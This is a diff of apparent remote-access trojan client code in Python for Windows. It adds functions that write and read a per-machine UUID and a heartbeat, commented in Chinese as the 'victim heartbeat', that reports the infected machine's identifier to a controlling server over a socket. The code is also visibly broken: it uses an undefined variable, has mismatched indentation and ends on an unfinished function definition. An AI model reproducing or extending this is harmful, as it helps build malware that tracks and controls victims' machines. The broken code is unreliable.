@@ -11,6 +11,7 @@ import win32con
 import win32api
 import uuid
 import shutil
+import json
 
 
 def remove_dir(dir):
@@ -27,13 +28,31 @@ def remove_dir(dir):
 
 
 class WinControl():
-	def __init__(self,patha="",pathb="",ip="",port=0000):
+	def __init__(self,patha="",pathb="",data=""):
 		self.path = ["C:"]
 		self.host = ""
 		self.patha = patha
 		self.pathb = pathb
-		self.ip = ip
-		self.port = port
+		self.data = data
+
+
+	def uuid_write(self):
+		#用于写入Windows的uuid唯一鉴别码
+		l = []
+		l.append(uuid.uuid4())
+
+		with open(self.patha,'w') as ojbk:
+			json.dump(l,ojbk)
+
+		return None
+
+
+	def uuid_read(self):
+		#用于读取uuid码的函数
+		with open(filename) as zx:  
+    		number = json.load(zx) 
+
+    	return number[0]
 
 
 	def where_i_am(self):
@@ -150,8 +169,16 @@ class Socketz():
 	 
 
 	def heart(self):
-		sock.send("up".encode("utf-8"))
+		#发送被害心跳的函数
+		sock.send("heart".encode("utf-8"))
+		my = sock.recv(1024).decode("utf-8")
+		#发送uuid
+		sock.send(self.data.encode("utf-8"))
+		server_rec = sock.recv(1024).decode("utf-8")
 
+		return server_rec
+
+	def 
 		
 		
 
